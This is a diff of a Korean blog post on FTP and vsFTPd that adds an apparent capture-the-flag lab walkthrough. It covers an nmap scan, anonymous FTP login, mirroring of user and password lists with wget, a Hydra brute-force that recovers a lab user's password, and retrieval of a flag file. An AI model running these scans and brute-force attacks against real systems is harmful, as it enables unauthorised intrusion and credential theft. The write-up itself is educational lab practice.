@@ -80,7 +80,7 @@ Active FTP는 클라이언트가 TCP PORT 21을 통해 설명한 대로 연결�
 ## vsFTPd 설치
 
 ```bash
-sudo apt install vsftpd 
+$ sudo apt install vsftpd 
 ```
 
 **vsFTPd**는 리눅스, 유닉스 시스템에서 FTP 서비스를 제공하는 서버 프로그램이다.
@@ -89,7 +89,7 @@ sudo apt install vsftpd
 ## vsFTPd 구성 파일
 
 ```bash
-cat /etc/vsftpd.conf | grep -v "#"
+$ cat /etc/vsftpd.conf | grep -v "#"
 ```
 
 위 명령어 실행 후, 주요 옵션들을 살펴보면 다음과 같다.
@@ -114,6 +114,129 @@ cat /etc/vsftpd.conf | grep -v "#"
 | no_anon_password=YES | 비밀번호 없이 접속 |
 
 # 실습
+
+## Portscan
+
+먼저 대상 Host(`10.129.73.118`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다.
+
+```bash
+$ nmap -sC -sV 10.129.73.118                                              
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 06:17 EDT
+Nmap scan report for 10.129.73.118
+Host is up (0.28s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
+|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
+|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
+53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+139/tcp  open  netbios-ssn Samba smbd 4
+445/tcp  open  netbios-ssn Samba smbd 4
+2121/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (InlaneFTP) [10.129.73.118]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port2121-TCP:V=7.95%I=7%D=9/25%Time=68D516AF%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,8C,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.
+SF:73\.118\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
+SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
+SF:r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: 3s
+|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-09-25T10:17:43
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 76.43 seconds
+```
+
+Nmap 스캔을 통해 `SSH`, `DNS`, `SMB`, `FTP` 등 총 5개의 주요 서비스가 확인되었으며,
+특히 **ProFTPD FTP(2121)** 와 Samba 공유(139/445) 는 인증 우회, 익명 접근 시도를 통해
+파일 획득이나 초기 침투 지점으로 활용될 가능성이 있다.
+
+## FTP 서버 접속
+
+이제 FTP 서버가 동작 중임을 확인했으므로, anonymous 계정으로 접속을 시도한다.
+
+```bash
+$ ftp 10.129.73.118 2121
+```
+
+익명 로그인(anonymous)에 성공하자,
+FTP 루트 경로에 **passwords.list**와 **users.list** 두 개의 파일이 존재함을 확인하였다.
+
+![Domain](/assets/network-screenshots/ftp/ftp-server.png)
+
+이제 이 파일들을 로컬 환경으로 내려받아 분석할 것 이다.
+
+## wget 파일 다운로드
+
+FTP는 `get` 명령으로도 받을 수 있지만, 편의상 `wget`을 사용하면 한 번에 받을 수 있다.
+
+```bash
+$ wget -m --no-passive ftp://anonymous:anonymous@10.129.73.118:2121
+```
+
+위 명령어를 사용하여 FTP 루트 경로에 있는 **passwords.list**와 **users.list** 파일 두개를 다운로드 받았다.
+
+![Domain](/assets/network-screenshots/ftp/wget-download.png)
+
+## hydra 브루트 포싱
+
+wget으로 다운로드한 폴더 안으로 이동한 뒤, `Hydra`를 이용해 브루트 포싱을 시도하였다.
+
+```bash
+$ hydra -L users.list -P passwords.list ftp://10.129.73.118:2121
+```
+
+실행 결과, robin 사용자의 비밀번호가 `7iz4rnckjsduza7`으로 확인되었다.
+
+![Domain](/assets/network-screenshots/ftp/hydra.png)
+
+`Hydra`를 통해 확인한 `robin` 사용자의 계정과 비밀번호를 이용하여, 다시 FTP 서버에 접속을 시도하였다.
+
+## robin 사용자 계정 FTP 접속
+
+robin 사용자로 FTP에 접속 후 `ls` 명령어를 실행하니, `flag.txt` 파일이 존재하였다.
+
+![Domain](/assets/network-screenshots/ftp/find-flag.png)
+
+위 `flag.txt` 파일을 `get` 명령어를 활용하여 로컬로 다운로드하였다.
+
+```bash
+ftp> get flag.txt
+local: flag.txt remote: flag.txt
+229 Entering Extended Passive Mode (|||56536|)
+150 Opening BINARY mode data connection for flag.txt (27 bytes)
+    27      239.70 KiB/s 
+226 Transfer complete
+27 bytes received in 00:00 (0.09 KiB/s)
+```
+
+## Flag 획득
+
+로컬에서 다운로드한 `flag.txt` 파일을 확인한 결과,
+
+![Domain](/assets/network-screenshots/ftp/flag.png)
+
+이렇게 최종적으로 **flag**를 확보할 수 있었다.
+
+
+
 
 
 
